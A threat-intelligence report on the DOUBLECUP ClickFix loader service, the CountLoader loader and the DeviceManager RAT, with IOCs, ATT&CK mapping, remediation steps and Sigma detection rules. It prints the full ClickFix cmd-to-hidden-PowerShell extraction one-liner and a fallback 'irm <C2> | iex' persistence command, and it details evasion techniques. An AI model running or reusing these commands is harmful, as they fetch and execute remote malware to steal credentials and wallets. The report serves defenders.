# Technical Analysis Report: DOUBLECUP / CountLoader / DeviceManager RAT (2026-08-07)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-08-07
Version: 1.0

## Executive Summary

DOUBLECUP is a Russian-operated Loader-as-a-Service (LaaS) platform, active since early June 2026, that provides ClickFix social engineering infrastructure to deliver two malware families: CountLoader (a multi-platform loader with Windows and macOS variants) and DeviceManager (a Python-based RAT). The service is notable for its use of steganographic PNG images cached in the victim's browser to stage payloads, combined with environmental keying that uses the victim's public IP address as a cryptographic key for payload decryption -- rendering sandbox analysis ineffective. DeviceManager introduces EtherHiding, resolving its C2 infrastructure dynamically via Ethereum/Polygon smart contracts and communicating over DNS tunneling with queries spoofed to appear as Microsoft telemetry. The threat actor "Rognar" (@johnysilverhe) operates the service through a Telegram bot (@harrypoterlohBOT) and a licensing panel. Discovery was triggered by an open directory at 213.139.77[.]109:9090.

## Background: Targeted CRM Users and Cryptocurrency Holders

DOUBLECUP targets enterprise users through bogus CRM login pages impersonating NetSuite, Odoo, HubSpot, and Salesforce. These phishing pages embed iframes containing ClickFix commands that trick users into copying and executing PowerShell/cmd commands. CountLoader specifically profiles victims for cryptocurrency wallet software and browser extensions (scanning 48 extension IDs across 45 browsers), Signal Desktop, and corporate domain membership -- indicating a financial theft and espionage motivation. The service model provides operators with licenses and a client agent, handling infrastructure including steganographic image hosting, session management, encryption keys, and automatic payload rebuilding.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| Early June 2026 | DOUBLECUP service becomes operational with LaaS model |
| 2026-06-xx | Multiple ClickFix campaigns observed targeting CRM users via phishing domains |
| 2026-07-xx | Open directory discovered at 213.139.77[.]109:9090 exposing test files and licensing panel |
| 2026-08-03 | SOCRadar STRU publishes primary technical analysis |
| 2026-08-04 | The Hacker News, BleepingComputer publish coverage |

## Root Cause: ClickFix Social Engineering (T1204.002)

Initial access is achieved through ClickFix social engineering. Victims visit phishing pages impersonating CRM platforms (login-netsuite[.]com, login-odoo[.]com, login-hubspot[.]com, verification-salesforce[.]com, login-salesforce[.]com). The pages display a fake CAPTCHA UI prompting users to click a "Copy" button, which places browser-specific commands into the clipboard. When the victim pastes and executes the command (typically via Win+R or terminal), it triggers the multi-stage infection chain.

## Technical Analysis of the Malicious Payload

### 1. DOUBLECUP Session Initialization and Steganographic PNG Staging

Upon page load, the ClickFix landing page executes JavaScript that:
1. Generates a 16-character alphanumeric Session ID (`_sid`)
2. Registers the session via `GET /session/reg?sid=[SessionID]&ip=[victim_IP]&ref=[referrer]`
3. Resolves the victim's public IP via ip-api[.]com or actor-controlled domains
4. Fetches browser-specific commands via `GET /api/config?sid=[SessionID]`
5. Background-downloads a steganographic PNG: `/stego-image.png?sid=[SessionID]`
6. Polls `GET /session/check?sid=[SessionID]` at 1.2-3 second intervals

The ClickFix command tailored for Microsoft Edge:
```
cmd /c for /f "delims=" %p in ('where pow?r?hell.exe') do @for /r
"C:\Users\<Username>\AppData\Local\Microsoft\Edge\User Data" %f in (f_*) do @if
%~zf==304204 start "" /min cmd /c findstr "ZZ1984" "%f"|"%p" -NoP -W Hidden -EP B -C -
```

Key observations:
- `pow?r?hell.exe` -- wildcard obfuscation to evade process name matching
- Searches browser cache by exact file size (304204 bytes) to locate the cached steganographic PNG
- Uses `findstr "ZZ1984"` to extract the hidden payload from the PNG using a magic marker string
- Pipes output directly to PowerShell with hidden window (`-W Hidden`) and bypass execution policy (`-EP B`)

### 2. Steganographic Payload Extraction and Environmental Keying

The first stage extracts code from the cached PNG via one of three methods: findstr with the ZZ1984 marker, certutil decoding, or LSB (Least Significant Bit) extraction. The extracted Stage 1 notifies the C2 via `POST /session/signal?sid=[SessionID]&ip=[victim_IP]`, then executes Stage 2 scripts also embedded in the PNG.

Stage 2 performs environmental keying:
1. Queries external IP verification APIs (ip-api[.]com, ipify[.]co, icanhazip[.]com)
2. Derives a 32-byte key via PBKDF2(SHA-256) with the victim's public IPv4 address as password
3. Decrypts the final payload using a custom SHA-256 stream cipher in Counter (CTR) mode with bitwise XOR
4. Validates payload integrity against a hardcoded SHA-256 hash (bytes 40-71)
5. Reflectively loads a .NET assembly or executes a PowerShell ScriptBlock in memory

This environmental keying ensures payloads only unpack on the intended victim machine, defeating sandbox detonation.

### 3. C2 Infrastructure

#### DOUBLECUP Session Management
- Registration: `GET /session/reg?sid=&ip=&ref=`
- Configuration: `GET /api/config?sid=`
- Status polling: `GET /session/check?sid=&infected=` (1.2-3s intervals)
- Signal: `POST /session/signal?sid=&ip=`
- Completion: returns `{"done": true, "redirect": "..."}`

#### CountLoader 4.5p C2 (HTTP)
- Initial beacon: `GET /connect?hwid=<MD5>&os=&av=&username=&corp=&domain=&version=4.5p&key=K94DGQ99VYCCH52TKOT2&ledger=&wallets=&exts=&extlist=&task=&signal=`
- Authentication: JWT Bearer token returned from `/connect`
- Command retrieval: `POST /getUpdates` with encrypted body
- C2 encoding: Hexadecimal (`ToString('x4')`) with 6-digit XOR key prepended (avoids Base64 and `ConvertFrom-Json` AMSI monitoring)
- Task acknowledgment: `POST /approveUpdate?id=<task_id>`
- 25-minute polling interval

#### DeviceManager RAT C2 (EtherHiding + DNS Tunneling)
**Blockchain C2 Resolution:**
- Smart contract: `0xc027490AF56a9d7050fc259Ecd03DA1580b84aae`
- Ethereum address: `0xCE17b1EF00d47105Bc127BbE6fC45dE47BC22fb8`
- Function selectors: `0x1dcf296b` (getData), `0xc474520d` (updateGlobalC2), `0x71c28139` (targetedC2)
- Decryption: ChaCha20 with nonce derived from smart contract address
- Device-specific or campaign-wide C2 resolution via device hash

**DNS Tunneling (primary):**
- All queries append `.microsoft.com` to spoof legitimate Microsoft telemetry
- A records: Check-in (`{device_hash}{tag_short}.microsoft.com`)
- TXT records: System info exfil (`i-{device_hash}-{info_hex}.microsoft.com`), task polling (`t-{device_hash}-{process_id}.microsoft.com`), payload download, command output, status updates
- C2 server: 91.92.240[.]100
- Long payloads split into 63-character DNS label chunks

### 4. Platform-Specific Behavior

#### Windows (CountLoader 4.5p)
- Downloads `python-3.13.13-embed-amd64.zip` to `%USERPROFILE%\Python313`
- Drops `App_<GUID>.py` as process masquerading wrapper
- Copies and PE-header-patches legitimate binaries (conhost.exe, powershell.exe, mshta.exe) with prefix identifiers (c, p, m)
- Overwrites OriginalFilename, InternalName, FileDescription in PE metadata
- Creates dual redundant scheduled tasks: `GoogleUpdateService<GUID>` and `MSEdgeUpdateService<GUID>` (25-min intervals, WakeToRun enabled)
- Fallback persistence: `"csvchost.exe" -""h""e""a""d""l""e""ss "psvchost.exe" -ep bypass -c "irm <C2> | iex"`
- Scans 45 browsers for 48 cryptocurrency wallet extension IDs
- Checks for Ledger, Trezor, Exodus, Atomic, Guarda, KeepKey, BitBox02

#### macOS (CountLoader)
- Stager: `hxxps://appleid-customertelemetry[.]gl/setup[.]sh` and `/AppleIDVerificationService`
- Uses `/usr/bin/sw_vers`, `system_profiler`, `ioreg`, `/usr/bin/curl`
- Persistence via LaunchAgent: `~/Library/LaunchAgents/` plist loaded via `launchctl`
- Cross-compiled from Windows (artifacts: `C:\Users\Administrator\source\repos\TestApp\Mac_C\main.c`)
- Supports x86_64 and arm64 (Apple Silicon)

#### Windows (DeviceManager RAT)
- Delivered as Delphi-compiled Inno Setup installer (`MicroUpdaterV1.exe`)
- IPC handoff: `/SL5="$<HWND>,10201996,893952,<filepath>"` (byte offset, payload size)
- Installs to: `%LOCALAPPDATA%\Microsoft\WindowsApps\Microsoft.PythonApp_yadfiy2x1ep12\`
- Files: `config.json`, `agent.log` (rotating), `agent_main.pyw`, `agent/` directory
- Primary persistence: `schtasks.exe /Create /F /TN "MicroUpdaterV1" /XML "%TEMP%\t.xml"` (10-min interval; t.xml deleted immediately)
- Alternative persistence: WMI Event Subscription via direct COM API calls (ctypes to ole32.dll, oleaut32.dll):
  - `__IntervalTimerInstruction "PythonAppTimer_600"` (10-min timer)
  - `__EventFilter "PythonAppUpdateFilter"`
  - `CommandLineEventConsumer "PythonAppUpdateConsumer"`
- Mutex: MD5(Machine GUID + Disk ID)
- CIS language locale check -- self-deletes if detected

### 5. Anti-Forensics / Evasion Techniques

- **Steganographic staging:** Payload hidden in standard PNG images in browser cache, extracted via legitimate Windows tools (findstr, certutil)
- **Environmental keying (T1480.001):** Victim's public IP as PBKDF2 seed; fails in sandboxes or different networks
- **Reflective code loading (T1620):** .NET assembly loaded directly into memory; no disk artifacts
- **PowerShell obfuscation:** Wildcard expansion (`pow?r?hell.exe`), XOR string obfuscation (`-bxor 210`, `-bxor 63`), dynamic namespace reconstruction via Reflection (AMSI bypass)
- **PE header patching (T1036.003):** Copies legitimate binaries and overwrites PE metadata fields to masquerade as auto-start applications
- **Regex JSON parser:** Avoids `ConvertFrom-Json` which is AMSI-monitored
- **WMI persistence via COM API:** Direct ctypes calls to ole32.dll/oleaut32.dll bypasses process-lineage and command-line monitoring
- **DNS query spoofing:** Appends `.microsoft.com` to all DNS tunneling queries to mimic legitimate telemetry
- **Wake-and-die cycle:** Malicious process active only seconds per 25-minute scheduled run
- **Inno Setup temp file cleanup:** Deletes `%TEMP%\t.xml` immediately after task creation

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`)
> - IP addresses: `[.]` replacing dots (e.g., `1.2.3[.]4`)

### File System

| Platform | Path / Filename | Hash (SHA256) | Description |
|----------|------|---------------|-------------|
| Windows | DOUBLECUP client agent | `882914f9014f14e89123e835f103ac8f9d4b2e358c1f21c1cbc7f1054e6afed6` | DOUBLECUP operator client |
| Windows | DOUBLECUP client agent | `8585721cbc46780903bd727e37a9ed07a33463852046ff65bc718ded4c80dfb1` | DOUBLECUP operator client (variant) |
| Windows | 2nd stage steganographic PNG | `28cbbca8099bb1b27668d135314842c69ceb478a7d6b4b08f063d106a06c8f9d` | Steganographic payload image |
| Windows | MicroUpdaterV1.exe | `6e08cb5602f63bee2b40739167b4aef77763bc8fb47b4839ca2fc1607ad35cba` | DeviceManager Inno Setup installer |
| Windows | run.pyw | `ea70895620f955b0712b85c3fee41de7437d5068267966f0b4fb6fa2704c3a50` | DeviceManager RAT entry point |
| Windows | CountLoader | `bdf28e611d77362c40a0445655a35943c03accf21bb9a5af755da7eac5ea5e40` | CountLoader 4.5p Windows |
| macOS | setup.sh | `afe273533d6f9d0b8852988f6a4b34571dd52af4c690e54723a86257aa8a015d` | macOS CountLoader stager |
| macOS | AppleIDVerificationService | `08730fda7366104b1461b12834f55723381bf34a234947689c708b1ee431af69` | macOS CountLoader binary |
| Windows | `%LOCALAPPDATA%\Microsoft\WindowsApps\Microsoft.PythonApp_yadfiy2x1ep12\config.json` | -- | DeviceManager configuration |
| Windows | `%LOCALAPPDATA%\Microsoft\WindowsApps\Microsoft.PythonApp_yadfiy2x1ep12\agent.log` | -- | DeviceManager rotating log |
| Windows | `%LOCALAPPDATA%\Microsoft\WindowsApps\Microsoft.PythonApp_yadfiy2x1ep12\agent_main.pyw` | -- | DeviceManager entry point |
| Windows | `%TEMP%\t.xml` | -- | Temporary scheduled task XML (deleted after use) |
| Windows | `%USERPROFILE%\App_<GUID>.py` | -- | CountLoader process masquerading script |

### Network

| Type | Value | Context |
|------|-------|---------|
| IP | 213.139.77[.]109:9090 | DOUBLECUP license panel / open directory |
| IP | 80.96.109[.]229 | DOUBLECUP operational |
| IP | 167.148.201[.]131 | DOUBLECUP operational |
| IP | 89.124.117[.]12 | DOUBLECUP operational |
| IP | 103.22.137[.]227 | DOUBLECUP operational |
| IP | 146.70.124[.]154 | DOUBLECUP operational |
| IP | 67.219.107[.]181 | Payload builder / Telegram callback |
| IP | 91.92.240[.]100 | DeviceManager C2 (DNS tunneling) |
| Domain | srv641398444.host.ultaserver[.]net | DOUBLECUP server |
| Domain | nxtdrcliam[.]site | DOUBLECUP server |
| Domain | canva-arts[.]com | Delivery infrastructure |
| Domain | cloud-electronic[.]com | Delivery infrastructure |
| Domain | cloudscraft[.]com | Delivery infrastructure |
| Domain | doublecap[.]ltd | Delivery infrastructure |
| Domain | doublecap[.]live | Delivery infrastructure |
| Domain | examcanvas[.]com | Delivery infrastructure |
| Domain | storagepioneer[.]com | Delivery infrastructure |
| Domain | supercloudsaver[.]com | Delivery infrastructure |
| Domain | ticgo-cloud[.]com | Delivery infrastructure |
| Domain | roqqcloud[.]com | Delivery infrastructure |
| Domain | login-netsuite[.]com | ClickFix phishing |
| Domain | login-odoo[.]com | ClickFix phishing |
| Domain | verification-salesforce[.]com | ClickFix phishing |
| Domain | login-salesforce[.]com | ClickFix phishing |
| Domain | login-hubspot[.]com | ClickFix phishing |
| Domain | pending-verification[.]com | ClickFix phishing |
| Domain | alphastore[.]vg | CountLoader Windows C2 |
| Domain | appleid-customertelemetry[.]gl | macOS CountLoader C2 |
| URL | hxxp://67[.]219[.]107[.]181/hgflssvslvidfugvbldiuv | Telegram bot callback |
| URL | hxxps://appleid-customertelemetry[.]gl/setup[.]sh | macOS stager |
| URL | hxxps://s3[.]us2[.]lyve[.]seagate[.]com/fullstack09/MicroUpdaterV1[.]exe | DeviceManager installer |
| Blockchain | 0xc027490AF56a9d7050fc259Ecd03DA1580b84aae | DeviceManager smart contract |
| Blockchain | 0xCE17b1EF00d47105Bc127BbE6fC45dE47BC22fb8 | Ethereum address |

### Behavioral

- **Steganographic marker:** String `ZZ1984` in PNG files used to locate and extract embedded payloads
- **Browser cache search by exact file size:** `%~zf==304204` in for-loop searching Edge/Chrome User Data directories
- **PowerShell wildcard evasion:** `pow?r?hell.exe` with `-W Hidden -EP B` flags
- **Scheduled tasks:** `GoogleUpdateService<GUID>`, `MSEdgeUpdateService<GUID>` (25-min), `MicroUpdaterV1` (10-min)
- **WMI objects:** `PythonAppUpdateFilter`, `PythonAppUpdateConsumer`, `PythonAppTimer_600`
- **PE header patching:** Legitimate binaries (conhost.exe, powershell.exe, mshta.exe) copied and OriginalFilename/InternalName overwritten
- **DNS tunneling pattern:** `{prefix}-{16-char-hex-hash}-{data}.microsoft.com` for various record types
- **Campaign tracking key:** `K94DGQ99VYCCH52TKOT2` in CountLoader beacons
- **C2 API endpoints:** `/session/reg`, `/session/check`, `/session/signal`, `/api/config`, `/connect`, `/getUpdates`, `/approveUpdate`
- **Installation path:** `Microsoft.PythonApp_yadfiy2x1ep12` in WindowsApps directory
- **Inno Setup IPC pattern:** `/SL5="$<HWND>,10201996,893952,<filepath>"`

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1204.002 | User Execution: Malicious File | ClickFix lures trick users into pasting and executing commands from fake CRM login pages (ClickFix variant) |
| T1059.001 | PowerShell | DOUBLECUP Stage 2 execution, CountLoader C2 communication, DeviceManager task execution |
| T1059.003 | Windows Command Shell | cmd.exe for-loop extraction from browser cache, CountLoader command dispatch |
| T1059.006 | Python | CountLoader App.py wrapper, DeviceManager RAT (run.pyw/agent_main.pyw) |
| T1059.004 | Unix Shell | macOS CountLoader uses /bin/bash and curl |
| T1027.003 | Steganography | Malicious code hidden in PNG images cached in browser |
| T1027 | Obfuscated Files or Information | PowerShell wildcards (pow?r?hell.exe), XOR obfuscation (-bxor 63, -bxor 210) |
| T1140 | Deobfuscate/Decode Files or Information | SHA-256 CTR mode + XOR decryption with victim IP as key |
| T1480.001 | Environmental Keying | Public IPv4 address used as PBKDF2 seed for payload decryption |
| T1620 | Reflective Code Loading | .NET assembly loaded directly into memory (fileless) |
| T1036.003 | Masquerading: Rename System Utilities | PE header patching of conhost.exe, powershell.exe, mshta.exe |
| T1053.005 | Scheduled Task | GoogleUpdateService, MSEdgeUpdateService (CountLoader), MicroUpdaterV1 (DeviceManager) |
| T1546.003 | WMI Event Subscription | PythonAppUpdateFilter/Consumer/Timer_600 via direct COM API calls |
| T1543.001 | Launch Agent | macOS CountLoader persistence via LaunchAgent plist |
| T1547.009 | Shortcut Modification | CountLoader browser shortcut hijacking (unused but present in code) |
| T1082 | System Information Discovery | WMI queries for processor ID, UUID, disk model/serial, OS version |
| T1083 | File and Directory Discovery | Browser cache enumeration, wallet folder scanning |
| T1518.001 | Security Software Discovery | WMI AntiVirusProduct queries |
| T1102.001 | Dead Drop Resolver | EtherHiding via Ethereum/Polygon smart contracts for C2 resolution |
| T1071.001 | Application Layer Protocol: Web Protocols | CountLoader HTTP C2, DOUBLECUP session management |
| T1071.004 | Application Layer Protocol: DNS | DeviceManager DNS tunneling with spoofed .microsoft.com queries |
| T1573.001 | Encrypted Channel: Symmetric Cryptography | ChaCha20, XOR+hex encoding for C2 communications |
| T1105 | Ingress Tool Transfer | Payload download via HTTP and DNS |
| T1047 | Windows Management Instrumentation | System info collection and WMI persistence |

## Impact Assessment

DOUBLECUP represents a scalable, low-friction delivery platform that commoditizes ClickFix campaigns. The service model means multiple independent operators can launch campaigns simultaneously, increasing the threat surface. CountLoader's cryptocurrency wallet and browser extension scanning (48 extensions across 45 browsers) indicates direct financial theft motivation. DeviceManager's blockchain-based C2 resolution makes takedown extremely difficult -- the operator can rotate C2 servers globally via a single smart contract transaction. The environmental keying defeats most sandbox analysis, and the DNS tunneling mimics legitimate Microsoft telemetry, making network-based detection challenging without specific signatures.

## Detection & Remediation

### Immediate Detection

```powershell
# Check for CountLoader scheduled tasks
Get-ScheduledTask | Where-Object { $_.TaskName -match 'GoogleUpdateService|MSEdgeUpdateService|MicroUpdaterV1' }

# Check for DeviceManager installation directory
Test-Path "$env:LOCALAPPDATA\Microsoft\WindowsApps\Microsoft.PythonApp_yadfiy2x1ep12"

# Check for WMI event subscriptions
Get-WMIObject -Namespace root\Subscription -Class __EventFilter | Where-Object { $_.Name -match 'PythonApp' }
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -match 'PythonApp' }

# Check for PE-patched binaries in user profile
Get-ChildItem "$env:USERPROFILE" -Filter "*.exe" | Where-Object { $_.Name -match '^[cpm](svchost|OneDrive|conhost)' }

# Search for steganographic marker in browser cache
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Recurse -Filter "f_*" | Where-Object { $_.Length -eq 304204 }
```

### Remediation

1. **Containment:** Isolate affected endpoints; block all IOC IPs and domains at firewall/proxy
2. **Eradication:**
   - Remove scheduled tasks: `GoogleUpdateService*`, `MSEdgeUpdateService*`, `MicroUpdaterV1`
   - Delete WMI subscriptions: `PythonAppUpdateFilter`, `PythonAppUpdateConsumer`, `PythonAppTimer_600`
   - Remove installation directory: `%LOCALAPPDATA%\Microsoft\WindowsApps\Microsoft.PythonApp_yadfiy2x1ep12\`
   - Delete PE-patched binaries from `%USERPROFILE%`
   - Clear browser cache for affected profiles
   - On macOS: remove LaunchAgent plists from `~/Library/LaunchAgents/`
3. **Recovery:** Rotate all credentials on affected systems; revoke and regenerate cryptocurrency wallet keys if wallet extensions were detected; reset browser sessions
4. **Monitoring:** Deploy detection rules below; monitor for DNS TXT queries with structured subdomain patterns to `.microsoft.com` from non-Microsoft processes

### Long-Term Hardening

- Block clipboard-based command execution via Group Policy (restrict Win+R, disable cmd.exe for standard users where feasible)
- Deploy application whitelisting to prevent execution from `%USERPROFILE%` and `%TEMP%`
- Monitor for WMI event subscription creation via Sysmon Event ID 19-21
- Implement DNS monitoring for anomalous TXT query volumes and structured subdomain patterns
- Block known ClickFix phishing domains at web proxy level
- Consider blocking Ethereum/Polygon RPC endpoints from non-browser processes

## Detection Rules

These detections target DOUBLECUP ClickFix delivery, CountLoader persistence, DeviceManager RAT C2, and associated infrastructure at PoC/advisory-specific altitude with strict leniency. All Sigma rules convert to Splunk and CrowdStrike LogScale; Suricata rules compile against v7.0.3; YARA rules compile against yarac 4.5.0. Compiles does not equal fires -- verify against your pipeline telemetry.

### Sigma: DOUBLECUP Steganographic PNG Extraction via Findstr

Detects findstr.exe searching for the DOUBLECUP-specific `ZZ1984` marker string to extract payloads from cached steganographic PNG files.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma convert --without-pipeline splunk exit 0; log_scale exit 0. ZZ1984 is the published steganographic marker unique to DOUBLECUP — no known benign use. sigma check failed due to network issue fetching MITRE ATT&CK data (proxy 403), not a rule syntax error. -->
```yaml
title: DOUBLECUP ClickFix Steganographic PNG Extraction via Findstr
id: 9a3c7e12-5f84-4b6d-a2e1-d8c0f3b71e94
status: experimental
description: >
    Detects the DOUBLECUP loader extracting hidden payloads from cached steganographic
    PNG files using findstr with the marker string ZZ1984, piped to PowerShell for
    fileless execution. This is the primary Stage 1 extraction mechanism.
references:
    - https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/
    - https://thehackernews.com/2026/08/doublecup-uses-clickfix-and-cached-pngs.html
author: Actioner
date: 2026/08/07
tags:
    - attack.t1027.003
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_findstr:
        Image|endswith: '\findstr.exe'
        CommandLine|contains: 'ZZ1984'
    condition: selection_findstr
falsepositives:
    - Unlikely - ZZ1984 is a DOUBLECUP-specific steganographic marker string
level: critical
```

### Sigma: DOUBLECUP PowerShell Wildcard Evasion with Hidden Window

Detects cmd.exe executing the DOUBLECUP ClickFix command pattern using literal wildcard characters (`pow?r?hell`) to locate PowerShell, combined with hidden window and bypass execution policy.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: sigma convert --without-pipeline splunk exit 0; log_scale exit 0. REVISION: replaced generic 'pow'+'hell' substrings (matched every PowerShell invocation) with literal 'pow?r?hell' wildcard pattern — the actual cmd.exe glob used by DOUBLECUP. Medium confidence: other ClickFix campaigns may adopt same wildcard evasion. -->
```yaml
title: DOUBLECUP PowerShell Wildcard Evasion with Hidden Window
id: b7d24f61-3e98-4a1c-bf52-6c9d8e0a4f37
status: experimental
description: >
    Detects cmd.exe command lines containing the literal wildcard pattern pow?r?hell
    (with ? glob characters) combined with hidden window and bypass execution policy,
    as used by DOUBLECUP ClickFix commands to locate PowerShell while evading
    process name matching.
references:
    - https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/
    - https://thehackernews.com/2026/08/doublecup-uses-clickfix-and-cached-pngs.html
author: Actioner
date: 2026/08/07
tags:
    - attack.t1059.001
    - attack.t1027
logsource:
    category: process_creation
    product: windows
detection:
    selection_cmd:
        Image|endswith: '\cmd.exe'
        CommandLine|contains|all:
            - 'pow?r?hell'
            - '-W Hidden'
            - '-EP B'
    condition: selection_cmd
falsepositives:
    - Other ClickFix campaigns adopting the same wildcard evasion technique
level: high
```

### Sigma: DOUBLECUP Browser Cache File Size Search

Detects cmd.exe for-loops searching browser cache directories by exact file size 304204 bytes (`%~zf==304204`), consistent with DOUBLECUP locating cached steganographic PNG payloads.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: sigma convert --without-pipeline splunk exit 0; log_scale exit 0. REVISION: added exact file size 304204 to make detection artifact-specific. Without the size constraint the pattern was too broad. Medium confidence: file size may change across campaigns. -->
```yaml
title: DOUBLECUP Browser Cache File Size Search via CMD For Loop
id: c8e35a72-4d19-4b7e-9f63-7a1b2c3d4e5f
status: experimental
description: >
    Detects cmd.exe for loop searching browser cache directories (Edge, Chrome)
    for files matching the exact size 304204 bytes, consistent with DOUBLECUP
    locating cached steganographic PNG payloads by byte size.
references:
    - https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/
    - https://thehackernews.com/2026/08/doublecup-uses-clickfix-and-cached-pngs.html
author: Actioner
date: 2026/08/07
tags:
    - attack.t1027.003
    - attack.t1083
logsource:
    category: process_creation
    product: windows
detection:
    selection_cmd:
        Image|endswith: '\cmd.exe'
        CommandLine|contains|all:
            - 'for /r'
            - 'User Data'
            - '%~zf'
            - '304204'
    condition: selection_cmd
falsepositives:
    - Legitimate browser cache management scripts iterating by exact file size (unlikely)
level: high
```

### Sigma: CountLoader Scheduled Task Persistence

Detects schtasks.exe creating tasks named `GoogleUpdateService` or `MSEdgeUpdateService`, the dual-redundancy persistence mechanism used by CountLoader 4.5p.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma convert --without-pipeline splunk exit 0; log_scale exit 0. Legitimate Google/Edge update services do not use schtasks.exe with these exact naming conventions (Google uses GUID-based names through COM, Microsoft Edge uses its own updater). -->
```yaml
title: CountLoader Scheduled Task Persistence via GoogleUpdateService or MSEdgeUpdateService
id: d9f46b83-5e2a-4c8f-a074-8b2c3d4e5f60
status: experimental
description: >
    Detects creation of scheduled tasks named GoogleUpdateService or MSEdgeUpdateService
    followed by a GUID, as used by CountLoader 4.5p for dual-redundancy persistence
    with 25-minute execution intervals.
references:
    - https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/
    - https://thehackernews.com/2026/08/doublecup-uses-clickfix-and-cached-pngs.html
author: Actioner
date: 2026/08/07
tags:
    - attack.t1053.005
logsource:
    category: process_creation
    product: windows
detection:
    selection_schtasks:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains:
            - 'GoogleUpdateService'
            - 'MSEdgeUpdateService'
    condition: selection_schtasks
falsepositives:
    - Legitimate Google or Microsoft Edge update services creating tasks (though they typically use different naming conventions)
level: high
```

### Sigma: DeviceManager RAT MicroUpdaterV1 Scheduled Task

Detects schtasks.exe creating the `MicroUpdaterV1` scheduled task, the primary persistence mechanism for DeviceManager RAT.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma convert --without-pipeline splunk exit 0; log_scale exit 0. REVISION: confidence corrected from invalid "critical" to "high" (valid values: low/medium/high). Sigma level: critical retained — MicroUpdaterV1 is DeviceManager-specific with no known legitimate use. -->
```yaml
title: DeviceManager RAT Scheduled Task Creation - MicroUpdaterV1
id: e0a57c94-6f3b-4d9e-b185-9c3d4e5f6a71
status: experimental
description: >
    Detects creation of the MicroUpdaterV1 scheduled task using XML from the temp
    directory, as used by DeviceManager RAT for persistence with 10-minute execution
    intervals.
references:
    - https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/
    - https://thehackernews.com/2026/08/doublecup-uses-clickfix-and-cached-pngs.html
author: Actioner
date: 2026/08/07
tags:
    - attack.t1053.005
logsource:
    category: process_creation
    product: windows
detection:
    selection_schtasks:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains|all:
            - '/Create'
            - 'MicroUpdaterV1'
    condition: selection_schtasks
falsepositives:
    - Unlikely - MicroUpdaterV1 is a DeviceManager-specific scheduled task name
level: critical
```

### Sigma: DeviceManager RAT WMI Event Subscription Artifacts (Hunt/Remediation)

Detects Sysmon WMI event subscription creation (EID 19-21) with DeviceManager-specific object names (`PythonAppUpdateConsumer`, `PythonAppUpdateFilter`, `PythonAppTimer_600`). Note: DeviceManager creates WMI objects via direct COM API calls (ctypes to ole32.dll/oleaut32.dll), bypassing wmic.exe -- this rule requires Sysmon with WMI event logging enabled.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: sigma convert --without-pipeline splunk exit 0; log_scale exit 0. REVISION: changed logsource from process_creation to wmi_event (Sysmon EID 19-21) — process_creation would never fire because DeviceManager uses COM API, not wmic.exe. Relabeled as hunt/remediation rule. Confidence corrected from invalid "critical" to medium (requires Sysmon WMI event logging which many environments lack). -->
```yaml
title: DeviceManager RAT WMI Event Subscription Persistence (Hunt)
id: f1b68da5-7a4c-4eaf-c296-0d4e5f6a7b82
status: experimental
description: >
    Hunt rule detecting WMI event subscription creation with names
    PythonAppUpdateFilter, PythonAppUpdateConsumer, or PythonAppTimer_600,
    used by DeviceManager RAT as an alternative persistence mechanism.
    DeviceManager creates these objects via direct COM API calls (ctypes),
    not wmic.exe. Requires Sysmon EID 19-21 logging.
references:
    - https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/
author: Actioner
date: 2026/08/07
tags:
    - attack.t1546.003
logsource:
    category: wmi_event
    product: windows
detection:
    selection:
        Name|contains:
            - 'PythonAppUpdateConsumer'
            - 'PythonAppUpdateFilter'
            - 'PythonAppTimer_600'
    condition: selection
falsepositives:
    - Unlikely - these are DeviceManager-specific WMI object names
level: critical
```

### Sigma: CountLoader PE-Patched Binary Masquerading

Detects execution of CountLoader's PE-header-patched binaries, which are legitimate Windows executables (conhost.exe, powershell.exe, mshta.exe) copied and renamed with single-character prefixes (c, p, m) combined with common system binary names (svchost, OneDrive, conhost).
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: sigma convert --without-pipeline splunk exit 0; log_scale exit 0. REVISION: replaced generic conhost --headless + irm/iex pattern (too broad) with specific PE-patched binary names from CountLoader's masquerading scheme. c/p/m prefix + svchost/OneDrive/conhost naming convention is highly specific. Medium confidence: new naming patterns may emerge in future versions. -->
```yaml
title: CountLoader PE-Patched Binary Masquerading
id: a2c79eb6-8b5d-4fb0-d3a7-1e5f6a7b8c93
status: experimental
description: >
    Detects execution of binaries matching CountLoader's PE-header-patching
    naming convention, where legitimate Windows executables are copied and
    renamed with c/p/m prefixes combined with common system binary names
    (svchost, OneDrive, conhost) to masquerade as legitimate auto-start
    applications.
references:
    - https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/
    - https://thehackernews.com/2026/08/doublecup-uses-clickfix-and-cached-pngs.html
author: Actioner
date: 2026/08/07
tags:
    - attack.t1036.003
logsource:
    category: process_creation
    product: windows
detection:
    selection_renamed:
        Image|endswith:
            - '\csvchost.exe'
            - '\psvchost.exe'
            - '\msvchost.exe'
            - '\cOneDrive.exe'
            - '\pOneDrive.exe'
            - '\mOneDrive.exe'
            - '\cconhost.exe'
            - '\pconhost.exe'
            - '\mconhost.exe'
    condition: selection_renamed
falsepositives:
    - Software using the exact same c/p/m + system binary naming convention (unlikely)
level: high
```

